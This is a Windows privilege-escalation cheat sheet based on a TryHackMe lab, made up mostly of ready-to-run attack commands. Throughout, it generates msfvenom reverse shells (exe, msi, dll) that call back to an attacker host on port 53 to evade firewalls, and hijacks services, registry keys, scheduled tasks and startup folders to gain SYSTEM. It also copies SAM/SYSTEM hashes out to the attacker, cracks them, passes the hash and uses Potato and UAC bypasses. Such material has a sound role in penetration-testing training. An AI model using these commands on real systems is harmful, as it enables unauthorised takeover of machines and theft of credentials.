# Windows Privilege Escalation Cheat Sheet
> Based on the TryHackMe Windows PrivEsc lab. Covers all 17 tasks plus additional real-world techniques.

---

## Table of Contents
- [Setup](#setup)
- [Service Exploits](#service-exploits)
- [Registry](#registry)
- [Credential Attacks](#credential-attacks)
- [Scheduled Tasks & Startup](#scheduled-tasks--startup)
- [Token Impersonation](#token-impersonation)
- [Miscellaneous Techniques](#miscellaneous-techniques)
- [Quick Reference Table](#quick-reference-table)

---

## Setup

### Generate a Reverse Shell Executable
**What it does:** Creates a standalone reverse shell binary using msfvenom and transfers it to the target via SMB.

> Port 53 (DNS) is used to blend in and bypass common egress firewall rules. Keep `reverse.exe` — it is reused in nearly every technique.

```bash
# Generate payload (Kali)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f exe -o reverse.exe

# Host via SMB (Kali — run in same directory as reverse.exe)
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .

# Transfer to target (Windows)
copy \\<KALI_IP>\kali\reverse.exe C:\PrivEsc\reverse.exe

# Start listener (Kali)
sudo nc -nvlp 53

# Execute (Windows)
C:\PrivEsc\reverse.exe
```

---

### PrivEsc Enumeration Scripts
**What it does:** Automated tools that surface misconfigurations, weak permissions, and credential exposures quickly. Always run these first on a new foothold.

```cmd
.\winPEASany.exe
.\Seatbelt.exe -group=all
. .\PowerUp.ps1; Invoke-AllChecks
.\SharpUp.exe audit
```

> **winPEAS** is the most comprehensive. **PowerUp** is best for service misconfigs. **Seatbelt** focuses on security posture checks.

---

## Service Exploits

### Insecure Service Permissions
**What it does:** If your user has `SERVICE_CHANGE_CONFIG` on a service running as SYSTEM, you can redirect its binary path to your reverse shell.

**Look for:** `SERVICE_CHANGE_CONFIG` in accesschk output. `SERVICE_START_NAME : LocalSystem` in sc qc output.

```cmd
# Check user permissions on the service
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user <servicename>

# Confirm service runs as SYSTEM
sc qc <servicename>

# Redirect binary path to reverse shell
sc config <servicename> binpath= "\"C:\PrivEsc\reverse.exe\""

# Start listener on Kali, then trigger
net start <servicename>
```

---

### Unquoted Service Path
**What it does:** When a service binary path is unquoted and contains spaces, Windows tries multiple path interpretations before finding the real binary. Plant your shell at the first writable resolved path.

**Look for:** `BINARY_PATH_NAME` with spaces and no surrounding quotes. Write access to one of the intermediate directories.

**How Windows resolves `C:\Program Files\Unquoted Path Service\Common Files\service.exe`:**
```
C:\Program.exe                                             <- tried first
C:\Program Files\Unquoted.exe                             <- tried second
C:\Program Files\Unquoted Path Service\Common.exe         <- plant here
C:\Program Files\Unquoted Path Service\Common Files\service.exe
```

```cmd
# Find all unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Check write access to the directory
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"

# Plant reverse shell with the correct name
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"

# Start listener on Kali, then trigger
net start <servicename>
```

---

### Weak Registry Permissions
**What it does:** If the registry key for a service is writable, overwrite `ImagePath` to point to your reverse shell. The SCM reads this at start time — no need to touch sc config.

**Look for:** `NT AUTHORITY\INTERACTIVE` or `BUILTIN\Users` with `KEY_SET_VALUE` or `KEY_ALL_ACCESS` on the service registry key.

```cmd
# Check registry key permissions
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<servicename>

# Overwrite ImagePath
reg add HKLM\SYSTEM\CurrentControlSet\services\<servicename> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

# Start listener on Kali, then trigger
net start <servicename>
```

> `NT AUTHORITY\INTERACTIVE` covers all users with an active interactive or RDP session — a broad and often overlooked permission.

---

### Insecure Service Executable
**What it does:** When the service binary file itself is world-writable, simply replace it with your reverse shell. The SCM doesn't verify integrity — it just runs whatever is at the configured path.

**Look for:** `Everyone` or `BUILTIN\Users` with `FILE_ALL_ACCESS` or `FILE_WRITE_DATA` on the service binary.

```cmd
# Check file permissions
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"

# Replace binary with reverse shell
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y

# Start listener on Kali, then trigger
net start <servicename>
```

---

### Service Exploit Comparison

| Technique | What is weak | Method |
|-----------|-------------|--------|
| Insecure service permissions | Service object ACL | `sc config` binpath |
| Unquoted service path | Unquoted path + writable directory | Plant binary at resolved path |
| Weak registry ACL | Registry key ACL | `reg add` ImagePath |
| Insecure service executable | Binary file ACL | Overwrite `.exe` directly |

---

## Registry

### AutoRun Binary Hijack
**What it does:** AutoRun entries execute automatically on user logon. If the referenced binary is writable and a privileged user logs in, you get a shell running with their privileges.

**Look for:** Writable executables listed under the AutoRun registry keys below.

```cmd
# Find AutoRun entries
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Check write access on the binary
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

# Replace with reverse shell
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y

# Start listener on Kali, then trigger by opening a new RDP session (fires on logon)
rdesktop <TARGET_IP>
```

---

### AlwaysInstallElevated
**What it does:** When both HKLM and HKCU `AlwaysInstallElevated` keys are set to `1`, Windows Installer runs all `.msi` packages as SYSTEM — regardless of who triggers them.

**Look for:** Both registry keys returning `0x1`. If either is missing or `0` this technique will not work.

```cmd
# Check both keys — both must return 0x1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```bash
# Generate malicious .msi payload (Kali)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f msi -o reverse.msi

# Transfer to target using SMB (same method as setup)
```

```cmd
# Start listener on Kali, then run the installer (Windows)
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

---

## Credential Attacks

### Plaintext Credentials in Registry
**What it does:** AutoLogon stores credentials in plaintext under the Winlogon registry key. Admins sometimes configure this for convenience, leaving credentials exposed to any user.

**Look for:** `DefaultPassword` value under the Winlogon key, or any `REG_SZ` values containing the word "password".

```cmd
# Targeted check for AutoLogon credentials
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

# Broad search across entire HKLM (slow but thorough)
reg query HKLM /f password /t REG_SZ /s
```

```bash
# Use found credentials to spawn a shell (Kali)
winexe -U 'admin%<PASSWORD>' //<TARGET_IP> cmd.exe
```

---

### Saved Credentials (runas)
**What it does:** Windows can cache credentials used with `runas`. If admin credentials are saved, you can run any process as that user with no password prompt.

**Look for:** `cmdkey /list` showing saved entries for privileged accounts.

```cmd
# List saved credentials
cmdkey /list

# If no saved creds, refresh them
C:\PrivEsc\savecred.bat

# Start listener on Kali, then run reverse shell as admin using saved creds
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

---

### SAM Database Dump
**What it does:** The SAM file stores NTLM password hashes, encrypted with a boot key stored in the SYSTEM file. With both files you can extract and crack hashes offline.

**Look for:** SAM and SYSTEM backup files in `C:\Windows\Repair\` or `C:\Windows\System32\config\RegBack\`.

```cmd
# Transfer SAM and SYSTEM files to Kali
copy C:\Windows\Repair\SAM \\<KALI_IP>\kali\
copy C:\Windows\Repair\SYSTEM \\<KALI_IP>\kali\
```

```bash
# Use Tib3rius creddump7 fork — the Kali default is outdated for Windows 10
git clone https://github.com/Tib3rius/creddump7
pip3 install pycrypto
python3 creddump7/pwdump.py SYSTEM SAM

# Crack the NTLM hash
hashcat -m 1000 --force <HASH> /usr/share/wordlists/rockyou.txt

# Log in with cracked password
winexe -U 'admin%<PASSWORD>' //<TARGET_IP> cmd.exe
```

---

### Pass the Hash
**What it does:** NTLM authentication accepts the hash itself as proof of identity. You never need the plaintext password — authenticate directly with the raw hash.

**Look for:** Any obtained NTLM hash. The full hash is `LM:NTLM` — both parts separated by a colon.

```bash
# Spawn shell using hash (Kali)
pth-winexe -U 'admin%<LM:NTLM_HASH>' //<TARGET_IP> cmd.exe

# Alternatives
impacket-psexec admin@<TARGET_IP> -hashes <LM:NTLM>
impacket-wmiexec admin@<TARGET_IP> -hashes <LM:NTLM>
crackmapexec smb <TARGET_IP> -u admin -H <NTLM> -x whoami
```

---

## Scheduled Tasks & Startup

### Writable Scheduled Task Script
**What it does:** If a scheduled task runs as SYSTEM and executes a script you can write to, append your reverse shell command. Wait for the next scheduled run to get a SYSTEM shell.

**Look for:** Tasks running as SYSTEM with scripts or binaries in writable locations.

```cmd
# Enumerate scheduled tasks
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run"

# Check write access on the script
C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1

# Append reverse shell command
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1

# Start listener on Kali and wait for the task to fire
sudo nc -nvlp 53
```

---

### Writable Startup Folder
**What it does:** Files in the global StartUp folder execute for every user at logon. If `BUILTIN\Users` can write there, plant a shortcut to your reverse shell — it fires when any admin logs in.

**Look for:** `BUILTIN\Users` with `FILE_ADD_FILE` or `FILE_ALL_ACCESS` on the StartUp directory.

```cmd
# Check write access
C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

# Create shortcut (VBS script provided by the lab)
cscript C:\PrivEsc\CreateShortcut.vbs

# Start listener on Kali, then trigger with an admin RDP logon
rdesktop -u admin <TARGET_IP>
```

---

## Token Impersonation

> All techniques in this section require `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`, which are commonly held by service accounts, IIS application pools, and MSSQL service users.

```cmd
# Check for impersonation privileges
whoami /priv | findstr /i "impersonate\|assignprimarytoken"
```

---

### PrintSpoofer
**What it does:** Tricks the Print Spooler service (SYSTEM) into authenticating to a fake named pipe. Captures the SYSTEM token and impersonates it. Simpler than Potato attacks — no redirector needed.

**Look for:** `SeImpersonatePrivilege` enabled. Print Spooler service must be running (`sc query spooler`).

```bash
# Get a service account shell to work from (simulate via PSExec in the lab)
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
```

```cmd
# In the service account shell — start listener on Kali first
C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
```

---

### RoguePotato
**What it does:** Forces a SYSTEM-level DCOM process to authenticate to a rogue server on Kali. Captures and impersonates the token. Use as a fallback when PrintSpoofer is not viable.

**Look for:** `SeImpersonatePrivilege` enabled. Requires a socat redirector on Kali.

```bash
# Set up socat redirector — forwards Kali port 135 to Windows port 9999 (Kali)
sudo socat tcp-listen:135,reuseaddr,fork tcp:<TARGET_IP>:9999

# Get a service account shell (simulate via PSExec in the lab)
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe

# Start second listener on Kali
sudo nc -nvlp 53
```

```cmd
# In the service account shell
C:\PrivEsc\RoguePotato.exe -r <KALI_IP> -e "C:\PrivEsc\reverse.exe" -l 9999
```

---

### Potato Attack Variants

| Tool | Best for | Notes |
|------|---------|-------|
| PrintSpoofer | Windows 10 / Server 2016+ | No redirector needed. Requires Print Spooler running. |
| RoguePotato | Windows 10 / Server 2016+ | Needs socat redirector. Good fallback. |
| GodPotato | Windows 10/11 / Server 2019/2022 | Most modern option. |
| SweetPotato | Windows 10 / Server 2016/2019 | Combines multiple techniques. |
| JuicyPotato | Pre-Server 2019 | Older systems. Requires specific CLSID. |
| HotPotato | Windows 7/8 / early Win 10 | NBNS/WPAD spoofing based. |

---

## Miscellaneous Techniques

### Insecure GUI Application
**What it does:** GUI applications running as admin expose file open/save dialogs. Use the dialog's address bar to launch `cmd.exe` — it inherits the elevated context of the parent application.

**Look for:** Applications visible in `tasklist /V` running under an admin account, accessible over RDP.

```cmd
# Confirm the app is running as admin
tasklist /V | findstr mspaint.exe

# In the app: File > Open
# Click the address/navigation bar and paste:
file://c:/windows/system32/cmd.exe
# Press Enter to spawn an admin cmd prompt
```

---

### DLL Hijacking
**What it does:** When a privileged process loads a DLL from a writable directory, or searches PATH before reaching the legitimate DLL, you can plant a malicious replacement that executes with the process's privileges.

**Look for:** `NAME NOT FOUND` results for `.dll` files in Process Monitor where the search path includes a writable directory. Missing DLLs in writable locations on `%PATH%`.

```cmd
# Use Process Monitor (filter: Path ends with .dll AND Result is NAME NOT FOUND)
procmon.exe

# Check if the missing DLL's directory is writable
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Some\Writable\Dir\"
```

```bash
# Generate malicious DLL (Kali)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f dll -o hijack.dll
```

```cmd
# Place DLL in the writable directory with the expected name
copy hijack.dll "C:\Some\Writable\Dir\missing.dll"
```

---

### UAC Bypass
**What it does:** If you have a medium-integrity admin session, UAC blocks full admin access. Bypasses elevate your process to high integrity without triggering a UAC prompt.

**Look for:** `whoami /groups` showing `Mandatory Label\Medium Mandatory Level` while the user is in the `Administrators` group.

```cmd
# Check current integrity level and group membership
whoami /groups | findstr /i "medium\|high\|administrators"

# Common bypass methods
eventvwr.exe          # Environment variable hijack — Windows 7 to 10
fodhelper.exe         # Registry hijack — Windows 10
CMSTP.exe             # INF file based — works on many versions
```

```
# Automated tool covering many bypass techniques
https://github.com/hfiref0x/UACME
```

---

### Weak File and Folder Permissions (General)
**What it does:** Beyond service binaries, any executable run by a privileged process or scheduled task that you can overwrite is a potential vector. Always audit files executed by SYSTEM or admin accounts.

**Look for:** `Everyone` or `BUILTIN\Users` with write access on files or directories used by privileged processes.

```cmd
# Check directory permissions
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\SomeDirectory\"

# Check file permissions
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\SomePath\file.exe"

# Alternative using built-in icacls
icacls "C:\SomePath\file.exe"
```

---

## Quick Reference Table

| Technique | What is exploited | Privilege gained | Key check |
|-----------|------------------|-----------------|-----------|
| Weak service ACL | SERVICE_CHANGE_CONFIG permission | SYSTEM | `accesschk -uwcqv` |
| Unquoted service path | Spaces in unquoted BINARY_PATH_NAME | SYSTEM | `wmic service get pathname` |
| Weak registry ACL | Writable service registry key | SYSTEM | `accesschk -uvwqk` |
| Writable service binary | World-writable service .exe | SYSTEM | `accesschk -quvw` |
| AutoRun hijack | Writable AutoRun binary | Admin | `reg query ...CurrentVersion\Run` |
| AlwaysInstallElevated | GPO allows .msi to run as SYSTEM | SYSTEM | `reg query ...AlwaysInstallElevated` |
| Registry plaintext creds | AutoLogon password stored in plaintext | Admin | `reg query ...winlogon` |
| Saved credentials | Cached runas credentials | Admin | `cmdkey /list` |
| SAM dump + crack | Insecure backup of SAM/SYSTEM | Admin | `C:\Windows\Repair\` |
| Pass the Hash | NTLM auth accepts raw hash | Admin | Any obtained NTLM hash |
| Scheduled task script | Writable script run by SYSTEM task | SYSTEM | `schtasks /query` + `accesschk` |
| Startup folder | Writable global StartUp directory | Admin | `accesschk -d StartUp` |
| PrintSpoofer | SeImpersonatePrivilege + Print Spooler | SYSTEM | `whoami /priv` |
| RoguePotato | SeImpersonatePrivilege + DCOM | SYSTEM | `whoami /priv` |
| DLL hijacking | Missing/writable DLL on load path | SYSTEM | Process Monitor NAME NOT FOUND |
| Insecure GUI app | Elevated GUI exposes file dialog | Admin | `tasklist /V` |
| UAC bypass | Medium integrity admin session | Admin (High) | `whoami /groups` |
